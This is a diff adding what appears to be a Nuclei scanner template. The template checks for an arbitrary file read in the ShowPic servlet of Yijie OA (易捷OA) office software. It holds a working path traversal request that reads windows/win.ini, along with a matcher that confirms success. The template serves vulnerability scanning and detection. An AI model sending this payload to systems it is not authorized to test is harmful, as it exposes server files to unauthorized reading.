@@ -1,0 +1,21 @@
+id: yijieOA-ShowPic-File-reading
+
+info:
+  name: 易捷OA协同办公软件 ShowPic 任意文件读取
+  author: HuanXiong
+  severity: high
+  reference: |
+    -
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body,'; for 16-bit app support')"
